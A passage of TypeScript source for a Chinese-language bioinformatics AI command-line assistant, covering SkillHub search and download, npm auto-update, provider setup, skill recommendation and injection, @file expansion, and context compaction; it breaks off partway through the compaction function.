import readline from 'readline';
import { createInterface } from 'readline';
import chalk from 'chalk';
import { existsSync, readdirSync, readFileSync, writeFileSync, statSync, cpSync, mkdirSync } from 'fs';
import { join, resolve } from 'path';
import { homedir } from 'os';
import { get as httpsGet } from 'https';
import { exec } from 'child_process';
import OpenAI from 'openai';
import { loadConfig, saveConfig, ensureDirs, WORKFLOWS_DIR, SKILLS_DIR, TOOLS_DIR } from './config.js';
import { PROVIDERS } from './providers.js';
import { chat, compactMessages, estimateTokens as chatEstimateTokens, trimToolOutputs, deduplicateSkillInjections, type Message } from './chat.js';
import { executeTool } from './tools.js';
import { buildSystemPrompt } from './prompt.js';
import {
  loadDbRegistry, saveDbRegistry, addDbEntry, removeDbEntry,
  scanForDatabases, buildDbPromptSection,
  DOWNLOAD_GUIDES,
  type DatabaseRegistry, type DatabaseEntry,
} from './databases.js';
import { scanCommand, scanSkillMd, type RiskLevel } from './security.js';
import { routeSkill, SKILL_ROUTES, SKILL_CATEGORIES } from './skillRouter.js';
import {
  saveSession, loadSession, listSessions, deleteSession, getLastSession, newSessionId,
  saveCheckpoint, listCheckpoints, loadCheckpoint, deleteCheckpoint, clearCheckpoints,
  type SessionMeta, type Checkpoint,
} from './sessions.js';

declare const __APP_VERSION__: string;
const VERSION: string = __APP_VERSION__;

// ── SkillHub API ───────────────────────────────────────────────────────────────

const SKILLHUB_HUBS = {
  bgi:     { label: 'BGI内网',    apiBase: 'https://clawhub.ai', backend: 'clawhub' },
  clawhub: { label: 'clawhub.ai', apiBase: 'https://clawhub.ai', backend: 'clawhub' },
  tencent: { label: 'Tencent',    apiBase: 'https://lightmake.site', backend: 'tencent' },
} as const;

type HubKey = keyof typeof SKILLHUB_HUBS;

interface SkillResult {
  slug: string;
  name: string;
  summary: string;
  version?: string;
  owner?: string;
}

function httpGetJson(url: string): Promise<unknown> {
  const mod = url.startsWith('https') ? httpsGet : (require('http').get as typeof httpsGet);
  return new Promise((resolve, reject) => {
    const req = mod(url, { headers: { 'User-Agent': `bgicli/${VERSION}`, Accept: 'application/json' } }, (res) => {
      const chunks: Buffer[] = [];
      res.on('data', (c: Buffer) => chunks.push(c));
      res.on('end', () => {
        try { resolve(JSON.parse(Buffer.concat(chunks).toString())); }
        catch (e) { reject(new Error(`JSON parse error from ${url}`)); }
      });
    });
    req.setTimeout(10_000, () => { req.destroy(); reject(new Error('timeout')); });
    req.on('error', reject);
  });
}

async function searchSkillHub(query: string, hub: HubKey, limit = 10): Promise<SkillResult[]> {
  const cfg = SKILLHUB_HUBS[hub];
  if (cfg.backend === 'tencent') {
    const data = await httpGetJson(
      `${cfg.apiBase}/api/skills?page=1&pageSize=${limit}&keyword=${encodeURIComponent(query)}`
    ) as { code: number; data?: { skills?: Array<{ slug: string; name: string; description?: string; version?: string; ownerName?: string; homepage?: string }> } };
    if (data.code !== 0 || !data.data?.skills) return [];
    return data.data.skills.map(s => ({
      slug: s.slug,
      name: s.name,
      summary: s.description ?? '',
      version: s.version,
      owner: s.ownerName ?? (s.homepage ? s.homepage.replace(/.*clawhub\.ai\/([^/]+)\/.*/, '$1') : undefined),
    }));
  } else {
    const data = await httpGetJson(
      `${cfg.apiBase}/api/v1/search?q=${encodeURIComponent(query)}&limit=${limit}&nonSuspiciousOnly=true`
    ) as { results?: Array<{ slug: string; displayName?: string; summary?: string; version?: string }> };
    if (!data.results) return [];
    return data.results.map(s => ({
      slug: s.slug,
      name: s.displayName ?? s.slug,
      summary: s.summary ?? '',
      version: s.version ?? undefined,
    }));
  }
}

async function downloadSkillMd(slug: string): Promise<string> {
  const data = await new Promise<string>((resolve, reject) => {
    const req = httpsGet(
      `https://clawhub.ai/api/v1/skills/${encodeURIComponent(slug)}/file?path=SKILL.md`,
      { headers: { 'User-Agent': `bgicli/${VERSION}` } },
      (res) => {
        if (res.statusCode === 404) { req.destroy(); reject(new Error('not_found')); return; }
        const chunks: Buffer[] = [];
        res.on('data', (c: Buffer) => chunks.push(c));
        res.on('end', () => resolve(Buffer.concat(chunks).toString()));
      }
    );
    req.setTimeout(15_000, () => { req.destroy(); reject(new Error('timeout')); });
    req.on('error', reject);
  });
  return data;
}

// Store last search results for quick install by number
let _lastSearchResults: SkillResult[] = [];

// ── Auto-update ───────────────────────────────────────────────────────────────

function isNewer(latest: string, current: string): boolean {
  const [lM, lm, lp] = latest.split('.').map(Number);
  const [cM, cm, cp] = current.split('.').map(Number);
  if (lM !== cM) return lM > cM;
  if (lm !== cm) return lm > cm;
  return lp > cp;
}

async function checkAndAutoUpdate(): Promise<void> {
  // 1. Fetch latest version from npm registry (5s timeout)
  let latest: string;
  try {
    latest = await new Promise<string>((resolve, reject) => {
      const req = httpsGet(
        'https://registry.npmjs.org/@bgicli/bgicli/latest',
        { headers: { 'User-Agent': `bgicli/${VERSION}` } },
        (res) => {
          const chunks: Buffer[] = [];
          res.on('data', (c: Buffer) => chunks.push(c));
          res.on('end', () => {
            try { resolve((JSON.parse(Buffer.concat(chunks).toString()) as { version: string }).version); }
            catch { reject(new Error('parse')); }
          });
        },
      );
      req.setTimeout(5_000, () => { req.destroy(); reject(new Error('timeout')); });
      req.on('error', reject);
    });
  } catch {
    return; // no network / registry unreachable — skip silently
  }

  if (!isNewer(latest, VERSION)) return; // already up-to-date

  // 2. Newer version found — run npm install
  process.stdout.write(
    chalk.cyan(`\n  🔄 发现新版本 v${latest}（当前 v${VERSION}），正在自动更新...\n`),
  );

  const ok = await new Promise<boolean>((resolve) => {
    exec(
      `npm install -g @bgicli/bgicli@${latest} --registry https://registry.npmjs.org`,
      (error) => resolve(!error),
    );
  });

  if (ok) {
    process.stdout.write(chalk.green(`  ✓ 已更新至 v${latest}，重启 bgi 后生效\n\n`));
  } else {
    process.stdout.write(chalk.yellow(`  ⚠ 自动更新失败，请手动运行: npm install -g @bgicli/bgicli\n\n`));
  }
}

// ── Session context (module-level, set in main()) ─────────────────────────────
const SESSION_CTX = {
  id: '',
  createdAt: '',
  wdirSnapshot: null as Map<string, { path: string; mtime: number; size: number }> | null,
};

// ── Bundled data installer ─────────────────────────────────────────────────────
// When installed via npm, the data/ directory is bundled alongside dist/bgi.js.
// On first run we copy it to ~/.bgicli/ so the CLI can find workflows/tools/skills.

function installBundledData(): void {
  // __dirname points to the dist/ folder of the installed npm package
  const bundledData = join(__dirname, '..', 'data');
  if (!existsSync(bundledData)) return; // dev mode — data not bundled

  ensureDirs();

  const targets: Array<{ src: string; dest: string; name: string }> = [
    { src: join(bundledData, 'workflows'), dest: WORKFLOWS_DIR, name: 'Skills (生信工作流)' },
    { src: join(bundledData, 'skills'),    dest: SKILLS_DIR,    name: 'Skills (医学专科)' },
    { src: join(bundledData, 'tools'),     dest: TOOLS_DIR,     name: '工具' },
  ];

  let installed = false;
  for (const { src, dest, name } of targets) {
    if (!existsSync(src)) continue;
    // Only copy if destination is empty (don't overwrite user customizations)
    const isEmpty = !existsSync(dest) || readdirSync(dest).length === 0;
    if (isEmpty) {
      mkdirSync(dest, { recursive: true });
      cpSync(src, dest, { recursive: true });
      if (!installed) {
        process.stdout.write(chalk.dim('正在初始化内置数据...\n'));
        installed = true;
      }
      process.stdout.write(chalk.green(`  ✓ ${name} 已安装\n`));
    }
  }
  if (installed) console.log();
}

// ── Banner ────────────────────────────────────────────────────────────────────

function printBanner(): void {
  console.log(chalk.cyan.bold(`
  ██████╗  ██████╗ ██╗     ██████╗██╗     ██╗
  ██╔══██╗██╔════╝ ██║    ██╔════╝██║     ██║
  ██████╔╝██║  ███╗██║    ██║     ██║     ██║
  ██╔══██╗██║   ██║██║    ██║     ██║     ██║
  ██████╔╝╚██████╔╝██║    ╚██████╗███████╗██║
  ╚═════╝  ╚═════╝ ╚═╝     ╚═════╝╚══════╝╚═╝  v${VERSION}`));
  console.log(chalk.dim('  生物信息学 AI 终端助手 — Bioinformatics AI Terminal'));
  console.log();
}

function printHelp(): void {
  console.log(chalk.bold.cyan('─── 服务商 / 模型 ─────────────────────────────────────────'));
  console.log(`  ${chalk.cyan('/provider')} <name>   切换服务商 (bailian|intranet|custom)`);
  console.log(`  ${chalk.cyan('/model')} <name>      切换模型`);
  console.log(`  ${chalk.cyan('/models')}             列出当前服务商所有可用模型`);
  console.log(`  ${chalk.cyan('/providers')}          列出所有服务商`);
  console.log(`  ${chalk.cyan('/connect')} [prov]     配置 API Key`);
  console.log(`  ${chalk.cyan('/status')}             显示当前配置`);
  console.log();
  console.log(chalk.bold.cyan('─── 对话管理 ─────────────────────────────────────────────'));
  console.log(`  ${chalk.cyan('/clear')}              清空对话历史`);
  console.log(`  ${chalk.cyan('/history')}            查看对话统计（轮次 / Token 估算）`);
  console.log(`  ${chalk.cyan('/compact')}            立即压缩对话历史（超 60k token 自动触发）`);
  console.log(`  ${chalk.cyan('/save')} [名称]        保存对话为 Markdown 文件`);
  console.log(`  ${chalk.cyan('/think')} [on|off]     切换思考模式 (Qwen3 /think 前缀)`);
  console.log();
  console.log(chalk.bold.cyan('─── 会话持久化 ───────────────────────────────────────────'));
  console.log(`  ${chalk.cyan('/sessions')}           列出历史会话`);
  console.log(`  ${chalk.cyan('/resume')} [id]        恢复上次（或指定）会话`);
  console.log(`  ${chalk.cyan('/session-save')} [名称] 手动命名保存当前会话`);
  console.log(`  ${chalk.cyan('/session-del')} <id>   删除指定会话`);
  console.log();
  console.log(chalk.bold.cyan('─── 断点续传 ─────────────────────────────────────────────'));
  console.log(`  ${chalk.cyan('/checkpoint')}         保存当前对话断点`);
  console.log(`  ${chalk.cyan('/checkpoint list')}    列出当前会话所有断点`);
  console.log(`  ${chalk.cyan('/checkpoint restore')} <id>  恢复到指定断点`);
  console.log(`  ${chalk.cyan('/checkpoint clear')}   清除当前会话所有断点`);
  console.log();
  console.log(chalk.bold.cyan('─── Skills ───────────────────────────────────────────────'));
  console.log(`  ${chalk.cyan('/cat')}                按领域浏览 Skills 分类目录`);
  console.log(`  ${chalk.cyan('/sk')}                 列出全部 Skills`);
  console.log(`  ${chalk.cyan('/sk')} <关键词>        模糊搜索，匹配则注入，否则列出候选`);
  console.log(`  ${chalk.cyan('/wf')}                 同 /sk，别名`);
  console.log(`  ${chalk.cyan('/skills')}             查看当前会话已加载的 Skills`);
  console.log(`  ${chalk.cyan('/unload')} <id>        从当前会话卸载指定 Skill`);
  console.log(chalk.dim('  示例: /cat  /sk deseq2  /skills  /unload deseq2'));
  console.log(chalk.dim('  提示: 直接描述任务，AI 会自动识别并激活对应技能（加载前会询问确认）'));
  console.log();
  console.log(chalk.bold.cyan('─── 直接执行 ─────────────────────────────────────────────'));
  console.log(`  ${chalk.cyan('!<命令>')}             绕过 AI 直接执行 Shell 命令（实时输出）`);
  console.log(chalk.dim('  示例: !ls -la  !Rscript analysis.R  !python script.py  !samtools view -h a.bam'));
  console.log();
  console.log(chalk.bold.cyan('─── 工作流向导 ───────────────────────────────────────────'));
  console.log(`  ${chalk.cyan('/run')} <skill-id>     交互式参数向导，自动生成并执行分析脚本`);
  console.log(`  ${chalk.cyan('/check-env')} [id]     检测 Skill 所需 R/Python 包是否已安装`);
  console.log(`  ${chalk.cyan('/search')} <关键词>    在 SkillHub 搜索并下载技能 ${chalk.dim('[--hub=bgi|clawhub|tencent]')}`);
  console.log(`  ${chalk.cyan('/install')} <url|slug> 从 GitHub 或 SkillHub 安装 Skill（含安全扫描）`);
  console.log(`  ${chalk.cyan('/uninstall')} <id>     卸载已安装的第三方 Skill`);
  console.log();
  console.log(chalk.bold.cyan('─── 数据库管理 ──────────────────────────────────────────'));
  console.log(`  ${chalk.cyan('/db list')}            列出已注册参考数据库`);
  console.log(`  ${chalk.cyan('/db add')} <路径>      手动注册数据库路径（长期保存）`);
  console.log(`  ${chalk.cyan('/db scan')} [目录]     自动扫描文件系统查找已知数据库`);
  console.log(`  ${chalk.cyan('/db rm')} <id>         删除数据库记录`);
  console.log(`  ${chalk.cyan('/db download')} [名称] 显示标准数据库下载命令`);
  console.log();
  console.log(chalk.bold.cyan('─── 安全扫描 ────────────────────────────────────────────'));
  console.log(`  ${chalk.cyan('/scan')} <命令>        扫描命令安全风险 ${chalk.dim('[CRITICAL/HIGH/MEDIUM/LOW]')}`);
  console.log();
  console.log(chalk.bold.cyan('─── 文件 & 目录 ──────────────────────────────────────────'));
  console.log(`  ${chalk.cyan('/cd')} <路径>          更改工作目录`);
  console.log(`  ${chalk.cyan('/cwd')}                显示当前工作目录`);
  console.log(`  ${chalk.cyan('/diff')}               显示本次会话新增/修改的文件`);
  console.log(`  ${chalk.cyan('/tools')}              列出 AI 可调用的工具`);
  console.log(`  ${chalk.cyan('@路径')}               消息中内嵌文件内容 (例: @data.csv 里有什么?)`);
  console.log(`  ${chalk.cyan('@目录/')}              内嵌目录下所有文件摘要 (例: @results/)`);
  console.log(`  ${chalk.cyan('@*.csv')}              通配符内嵌多个文件 (例: @*.csv @*.tsv)`);
  console.log();
  console.log(chalk.bold.cyan('─── 其他 ─────────────────────────────────────────────────'));
  console.log(`  ${chalk.cyan('/help')}               显示本帮助`);
  console.log(`  ${chalk.cyan('exit')} / ${chalk.cyan('quit')} / ${chalk.cyan('q')}    退出`);
  console.log();
}

// ── First-run setup ───────────────────────────────────────────────────────────

async function setupApiKey(
  rl: readline.Interface,
  providerName: string,
): Promise<string> {
  const prov = PROVIDERS[providerName];
  console.log(chalk.yellow(`\n需要为 ${prov.name} 配置 API Key`));
  if (providerName !== 'custom') {
    console.log(chalk.dim('获取 Key: 在对应服务商官网注册账号并申请 API Key'));
  }
  const key = await question(rl, chalk.cyan('  API Key (无需鉴权可直接回车) › '));
  return key.trim();
}

async function setupCustomProvider(rl: readline.Interface): Promise<void> {
  const cfg = loadConfig();
  console.log(chalk.yellow('\n配置自定义 / 内网大模型服务'));
  console.log(chalk.dim('支持任何兼容 OpenAI Chat Completions API 的服务（vLLM、Ollama、LMStudio、FastChat 等）\n'));

  const currentUrl = cfg.customUrl ? chalk.dim(` (当前: ${cfg.customUrl})`) : '';
  const url = await question(rl, chalk.cyan(`  API Base URL (如 http://192.168.1.100:8080/v1)${currentUrl} › `));
  const trimmedUrl = url.trim() || cfg.customUrl || '';
  if (!trimmedUrl) {
    console.log(chalk.red('  URL 不能为空'));
    return;
  }

  const currentModel = cfg.customModel ? chalk.dim(` (当前: ${cfg.customModel})`) : '';
  const model = await question(rl, chalk.cyan(`  模型名称 (如 qwen2.5-72b-instruct, llama3.1-70b)${currentModel} › `));
  const trimmedModel = model.trim() || cfg.customModel || '';
  if (!trimmedModel) {
    console.log(chalk.red('  模型名称不能为空'));
    return;
  }

  const apiKey = await setupApiKey(rl, 'custom');

  cfg.customUrl = trimmedUrl;
  cfg.customModel = trimmedModel;
  cfg.provider = 'custom';
  cfg.model = trimmedModel;
  if (apiKey) cfg.apiKeys['custom'] = apiKey;
  saveConfig(cfg);

  console.log(chalk.green(`\n✓ 自定义服务商已配置`));
  console.log(`  URL:   ${chalk.cyan(trimmedUrl)}`);
  console.log(`  模型:  ${chalk.cyan(trimmedModel)}`);
  console.log(`  认证:  ${apiKey ? chalk.green('API Key 已设置') : chalk.dim('无需鉴权')}`);
  console.log();
}

async function firstRunIfNeeded(rl: readline.Interface): Promise<void> {
  const cfg = loadConfig();
  const prov = PROVIDERS[cfg.provider];
  // Skip if provider needs no auth (e.g. intranet)
  if (prov?.envKey === '') return;
  const hasKey =
    (cfg.apiKeys[cfg.provider] && cfg.apiKeys[cfg.provider].length > 0) ||
    (prov?.envKey && process.env[prov.envKey]);

  if (!hasKey) {
    console.log(chalk.yellow('\n欢迎使用 BGI CLI！首次使用需要配置 AI 服务商。\n'));
    console.log('请选择服务商:');
    const provList = Object.entries(PROVIDERS);
    provList.forEach(([key, p], i) => {
      const note = key === 'intranet' ? chalk.dim(' (内网，无需 Key)') : '';
      console.log(`  ${chalk.cyan(i + 1)}) ${p.name}${note}  ${chalk.dim(`(${key})`)}`);
    });
    console.log();

    const choice = await question(rl, chalk.cyan(`选择 (1-${provList.length}, 默认 1 百炼) › `));
    const idx = parseInt(choice.trim()) - 1;
    const [provKey] = provList[isNaN(idx) || idx < 0 || idx >= provList.length ? 0 : idx];

    if (provKey === 'custom') {
      await setupCustomProvider(rl);
    } else if (provKey === 'intranet') {
      cfg.provider = 'intranet';
      cfg.model = PROVIDERS['intranet'].defaultModel;
      saveConfig(cfg);
      console.log(chalk.green(`\n✓ 已切换到内网服务商，无需配置 Key\n`));
    } else {
      const apiKey = await setupApiKey(rl, provKey);
      if (apiKey) {
        cfg.provider = provKey;
        cfg.model = PROVIDERS[provKey].defaultModel;
        cfg.apiKeys[provKey] = apiKey;
        saveConfig(cfg);
        console.log(chalk.green(`\n✓ 已配置 ${PROVIDERS[provKey].name}\n`));
      }
    }
  }
}

// /wf is now an alias for /sk — both use the unified skill system

// ── Skill helpers ─────────────────────────────────────────────────────────────

interface SkillEntry { id: string; dir: string; tag: string; }

/** Collect all skills from both SKILLS_DIR and WORKFLOWS_DIR */
function collectAllSkills(): SkillEntry[] {
  const entries: SkillEntry[] = [];
  const addFrom = (dir: string, tag: string) => {
    if (!existsSync(dir)) return;
    readdirSync(dir).forEach((f) => {
      try {
        if (statSync(join(dir, f)).isDirectory()) entries.push({ id: f, dir, tag });
      } catch { /* skip */ }
    });
  };
  addFrom(SKILLS_DIR, 'skill');
  addFrom(WORKFLOWS_DIR, 'skill'); // workflows are skills too
  return entries;
}

function listSkills(keyword?: string): void {
  const all = collectAllSkills();
  if (all.length === 0) {
    console.log(chalk.yellow('暂无已安装的 Skills'));
    return;
  }
  const matched = keyword
    ? all.filter((e) => e.id.toLowerCase().includes(keyword.toLowerCase()))
    : all;

  if (matched.length === 0) {
    console.log(chalk.yellow(`未找到匹配 "${keyword}" 的 Skill`));
    console.log(chalk.dim('提示: 使用更简短的关键词，如 alphafold、pubmed、rnaseq、crispr、deseq2'));
    return;
  }
  const title = keyword
    ? `搜索结果 "${keyword}" (${matched.length} 个) — 使用 /sk <id> 加载:`
    : `全部 Skills (${matched.length} 个) — 使用 /sk <id> 加载:`;
  console.log(chalk.bold(title));

  const show = matched.slice(0, 50);
  show.forEach((e) => console.log(`  ${chalk.cyan(e.id)}`));
  if (matched.length > 50) console.log(chalk.dim(`  ... 还有 ${matched.length - 50} 个，请用关键词筛选`));
  console.log();
}

// ── LLM-powered skill recommendation ─────────────────────────────────────────

interface LlmSkillRec { id: string; name: string; reason: string; }

/**
 * Ask the configured LLM to recommend skills from the full catalog
 * based on a free-text user description. Returns up to 5 results.
 * Falls back to empty array on any error (network, parse, etc.).
 */
async function llmRecommendSkills(userQuery: string): Promise<LlmSkillRec[]> {
  const cfg = loadConfig();
  const prov = PROVIDERS[cfg.provider];
  if (!prov) return [];

  const apiKey = cfg.apiKeys[cfg.provider] ?? (prov.envKey ? process.env[prov.envKey] : undefined);
  const requiresKey = prov.envKey !== '';
  if (requiresKey && !apiKey) return [];

  const baseURL = cfg.provider === 'custom' ? (cfg.customUrl ?? prov.baseURL) : prov.baseURL;
  const model   = cfg.provider === 'custom' ? (cfg.customModel ?? cfg.model) : cfg.model;

  // Build a compact catalog: id | name | short-description
  const all = collectAllSkills();
  const catalogLines: string[] = [];
  for (const entry of all) {
    const skillPath = join(entry.dir, entry.id, 'SKILL.md');
    if (!existsSync(skillPath)) continue;
    const raw = readFileSync(skillPath, 'utf8');
    const { name, shortDesc } = parseSkillMeta(raw);
    const displayName = name || entry.id;
    const desc = shortDesc ? ` — ${shortDesc}` : '';
    catalogLines.push(`${entry.id}|${displayName}${desc}`);
  }

  if (catalogLines.length === 0) return [];

  const catalog = catalogLines.join('\n');
  const systemMsg = `你是一个生物信息学 Skill 推荐助手。
用户会描述他们想做的分析任务，你需要从下面的 Skill 目录中推荐最相关的 5 个（或更少）。

Skill 目录（格式: id|名称 — 简介）：
${catalog}

请严格按照以下 JSON 格式回复，不要输出任何其他内容：
[
  {"id": "skill-id", "name": "Skill 名称", "reason": "一句话说明为什么推荐"},
  ...
]`;

  try {
    const client = new OpenAI({ apiKey: apiKey || 'none', baseURL });
    const resp = await client.chat.completions.create({
      model,
      messages: [
        { role: 'system', content: systemMsg },
        { role: 'user',   content: userQuery },
      ],
      temperature: 0.2,
      max_tokens: 800,
    });
    const text = resp.choices[0]?.message?.content ?? '';
    // Extract JSON array from response (model may wrap in markdown code block)
    const jsonMatch = text.match(/\[[\s\S]*\]/);
    if (!jsonMatch) return [];
    const parsed = JSON.parse(jsonMatch[0]) as LlmSkillRec[];
    // Validate: only keep entries whose id actually exists in catalog
    const validIds = new Set(all.map((e) => e.id));
    return parsed.filter((r) => r.id && validIds.has(r.id)).slice(0, 5);
  } catch {
    return [];
  }
}

/** Parse name and short-description from a SKILL.md frontmatter block. */
function parseSkillMeta(content: string): { name: string; shortDesc: string } {
  // Support both YAML-style (---\n...\n---) and HTML-comment style frontmatter
  const fmMatch = content.match(/^---\n([\s\S]*?)\n---/) ||
                  content.match(/<!--[\s\S]*?-->\s*([\s\S]*?)(?=\n#|\n\n)/);
  if (!fmMatch) return { name: '', shortDesc: '' };
  const fm = fmMatch[1];
  const nameMatch = fm.match(/^name:\s*['"]?(.+?)['"]?\s*$/m);
  const descMatch = fm.match(/^short-description:\s*(.+)$/m);
  return {
    name:      nameMatch?.[1]?.trim()  ?? '',
    shortDesc: descMatch?.[1]?.trim()  ?? '',
  };
}

async function injectSkill(
  id: string,
  history: Message[],
  injectedSkills: Map<string, string>,
  rl: readline.Interface,
  skipConfirm = false,
): Promise<boolean> {
  const all = collectAllSkills();
  const match =
    all.find((e) => e.id === id) ||
    all.find((e) => e.id.startsWith(id)) ||
    all.find((e) => e.id.includes(id));

  if (!match) {
    console.log(chalk.red(`找不到 Skill: ${id}`));
    console.log(chalk.dim('使用 /sk <关键词> 搜索'));
    return false;
  }
  const skillPath = join(match.dir, match.id, 'SKILL.md');
  if (!existsSync(skillPath)) {
    console.log(chalk.red(`${match.id} 缺少 SKILL.md`));
    return false;
  }

  const content = readFileSync(skillPath, 'utf8');
  const { name, shortDesc } = parseSkillMeta(content);
  const displayName = name || match.id;

  // ── Confirmation prompt (unless skipConfirm) ──────────────────────────────
  if (!skipConfirm) {
    console.log();
    console.log(chalk.bold.cyan('┌─ 即将加载 Skill ────────────────────────────────────────'));
    console.log(`│  ${chalk.bold('ID:')}    ${chalk.cyan(match.id)}`);
    console.log(`│  ${chalk.bold('名称:')}  ${displayName}`);
    if (shortDesc) {
      // Word-wrap at 60 chars
      const words = shortDesc.split(' ');
      let line = '│  功能:  ';
      for (const w of words) {
        if (line.length + w.length > 70) {
          console.log(chalk.dim(line));
          line = '│         ' + w + ' ';
        } else {
          line += w + ' ';
        }
      }
      if (line.trim() !== '│') console.log(chalk.dim(line));
    }
    console.log(chalk.bold.cyan('└────────────────────────────────────────────────────────'));
    console.log();

    const ans = await question(rl, chalk.cyan('  确认加载此 Skill？[Y/n] › '));
    const confirmed = ans.trim() === '' || ans.trim().toLowerCase() === 'y';
    if (!confirmed) {
      console.log(chalk.dim('  已取消'));
      return false;
    }
  }

  history.push({
    role: 'user',
    content: `[Skill 已加载: ${match.id}]\n\n以下是该技能的操作指南，请严格按照说明执行：\n\n${content}`,
  });
  history.push({
    role: 'assistant',
    content: `✓ Skill **${match.id}** 已加载。我已阅读指南，随时可以开始。请告诉我您的具体数据和需求。`,
  });

  injectedSkills.set(match.id, displayName);
  console.log(chalk.green(`✓ Skill "${match.id}" 已加载到当前对话上下文`));
  return true;
}

// ── @file / @dir / @glob expansion ───────────────────────────────────────────

import { readdirSync as _readdirSync2, statSync as _statSync2 } from 'fs';

const FILE_SIZE_LIMIT = 100 * 1024; // 100 KB per file
const DIR_FILE_LIMIT  = 20;         // max files from a directory glob

/** Recursively list files in a directory (non-recursive, one level). */
function listDirFiles(dirPath: string): string[] {
  try {
    return _readdirSync2(dirPath)
      .map((f) => join(dirPath, f))
      .filter((p) => {
        try { return _statSync2(p).isFile(); } catch { return false; }
      });
  } catch {
    return [];
  }
}

/** Expand a single file path to its content block. */
function expandSingleFile(resolved: string): string {
  try {
    const stat = _statSync2(resolved);
    if (!stat.isFile()) return `[${resolved}: 不是文件]`;
    if (stat.size > FILE_SIZE_LIMIT) {
      return `\n\`\`\`\n[文件: ${resolved}]\n(文件过大 ${Math.round(stat.size / 1024)}KB，已跳过)\n\`\`\`\n`;
    }
    const content = readFileSync(resolved, 'utf8');
    const lines = content.split('\n');
    const preview = lines.length > 150
      ? lines.slice(0, 150).join('\n') + `\n... (共 ${lines.length} 行，已截断)`
      : content;
    return `\n\`\`\`\n[文件: ${resolved}]\n${preview}\n\`\`\`\n`;
  } catch {
    return `[无法读取: ${resolved}]`;
  }
}

function expandFileRefs(input: string): string {
  // Match @"path", @'path', or @token
  return input.replace(/@"([^"]+)"|@'([^']+)'|@([\/\w.*?~:-]+)/g, (match, q1, q2, q3) => {
    const rawPath = (q1 ?? q2 ?? q3) as string;
    const expanded = rawPath.replace(/^~/, homedir());

    // ── Directory: @path/ ──────────────────────────────────────────────────
    if (rawPath.endsWith('/') || rawPath.endsWith('\\')) {
      const dirResolved = resolve(expanded);
      if (!existsSync(dirResolved)) return match;
      const files = listDirFiles(dirResolved).slice(0, DIR_FILE_LIMIT);
      if (files.length === 0) return `[目录 ${dirResolved} 为空]`;
      const parts = [`\n[目录: ${dirResolved}  共 ${files.length} 个文件]`];
      for (const f of files) parts.push(expandSingleFile(f));
      return parts.join('\n');
    }

    // ── Glob: @*.csv, @data/*.tsv ──────────────────────────────────────────
    if (rawPath.includes('*') || rawPath.includes('?')) {
      const { globSync } = (() => {
        try { return require('glob'); } catch { return { globSync: null }; }
      })();
      let matched: string[] = [];
      if (globSync) {
        matched = (globSync(expanded, { absolute: true }) as string[]).slice(0, DIR_FILE_LIMIT);
      } else {
        // Fallback: simple *.ext in cwd
        const ext = rawPath.replace(/^.*\./, '.');
        matched = listDirFiles(process.cwd())
          .filter((f) => f.endsWith(ext))
          .slice(0, DIR_FILE_LIMIT);
      }
      if (matched.length === 0) return `[未找到匹配: ${rawPath}]`;
      const parts = [`\n[通配符匹配: ${rawPath}  共 ${matched.length} 个文件]`];
      for (const f of matched) parts.push(expandSingleFile(f));
      return parts.join('\n');
    }

    // ── Single file ────────────────────────────────────────────────────────
    const resolved = resolve(expanded);
    if (!existsSync(resolved)) return match;
    return expandSingleFile(resolved);
  });
}

// ── Workdir snapshot & diff ──────────────────────────────────────────────────

interface FileSnapshot { path: string; mtime: number; size: number; }

function snapshotWorkdir(dir: string): Map<string, FileSnapshot> {
  const snap = new Map<string, FileSnapshot>();
  function walk(d: string, depth = 0): void {
    if (depth > 3) return; // max 3 levels deep
    try {
      for (const entry of readdirSync(d)) {
        if (entry.startsWith('.') || entry === 'node_modules') continue;
        const full = join(d, entry);
        try {
          const st = statSync(full);
          if (st.isDirectory()) {
            walk(full, depth + 1);
          } else {
            snap.set(full, { path: full, mtime: st.mtimeMs, size: st.size });
          }
        } catch { /* skip */ }
      }
    } catch { /* skip */ }
  }
  walk(dir);
  return snap;
}

function diffWorkdir(
  before: Map<string, FileSnapshot>,
  after: Map<string, FileSnapshot>,
): { added: string[]; modified: string[] } {
  const added: string[] = [];
  const modified: string[] = [];
  for (const [path, snap] of after) {
    const prev = before.get(path);
    if (!prev) {
      added.push(path);
    } else if (snap.mtime !== prev.mtime || snap.size !== prev.size) {
      modified.push(path);
    }
  }
  return { added, modified };
}

// ── Save conversation ─────────────────────────────────────────────────────────

function saveConversation(history: Message[], filename?: string): void {
  if (history.length === 0) {
    console.log(chalk.yellow('对话历史为空，无内容可保存'));
    return;
  }
  const now = new Date();
  const stamp = now.toISOString().slice(0, 16).replace('T', '-').replace(':', '-');
  const outPath = resolve(filename || `bgicli-chat-${stamp}.md`);
  const lines = [`# BGI CLI 对话记录\n`, `> 导出时间: ${now.toLocaleString('zh-CN')}\n`];
  for (const msg of history) {
    if (msg.role === 'user') {
      lines.push(`\n## 👤 用户\n\n${msg.content}\n`);
    } else if (msg.role === 'assistant') {
      lines.push(`\n## 🤖 BGI CLI\n\n${msg.content}\n`);
    }
  }
  writeFileSync(outPath, lines.join('\n'), 'utf8');
  console.log(chalk.green(`✓ 对话已保存: ${outPath}`));
}

// ── Auto-compact ──────────────────────────────────────────────────────────────

// Context window thresholds
const COMPACT_TOKEN_THRESHOLD = 40_000; // ~140k chars; trigger compaction earlier
const COMPACT_KEEP_RECENT     = 8;      // keep last N messages intact after compaction
const WARN_TOKEN_THRESHOLD    = 30_000; // warn user when approaching limit

// Use the shared estimateTokens from chat.ts (consistent heuristic)
const estimateTokens = chatEstimateTokens;

async function maybeCompact(history: Message[], cfg: ReturnType<typeof loadConfig>): Promise<Message[]> {
  // Step 1: always deduplicate skill injections and trim tool outputs first
  // (cheap, no LLM call needed — often saves 10-30k tokens for free)
  let cleaned = deduplicateSkillInjections(trimToolOutputs(history));
  const tokensBefore = estimateTokens(history);
  const tokensAfter  = estimateTokens(cleaned);

  if (tokensAfter < tokensBefore) {
    const saved = tokensBefore - tokensAfter;
    process.stdout.write(chalk.dim(
      `\n[上下文优化: 去重/截断节省 ~${Math.round(saved / 1000)}k tokens]\n`
    ));
  }

  // Step 2: warn if approaching threshold
  if (tokensAfter >= WARN_TOKEN_THRESHOLD && tokensAfter < COMPACT_TOKEN_THRESHOLD) {
    process.stdout.write(chalk.dim(
      `[提示: 上下文已达 ~${Math.round(tokensAfter / 1000)}k tokens，接近压缩阈值 ${Math.round(COMPACT_TOKEN_THRESHOLD / 1000)}k]\n`
    ));
    return cleaned;
  }

  if (tokensAfter < COMPACT_TOKEN_THRESHOLD) return cleaned;

  // Step 3: LLM-based summarization of older messages
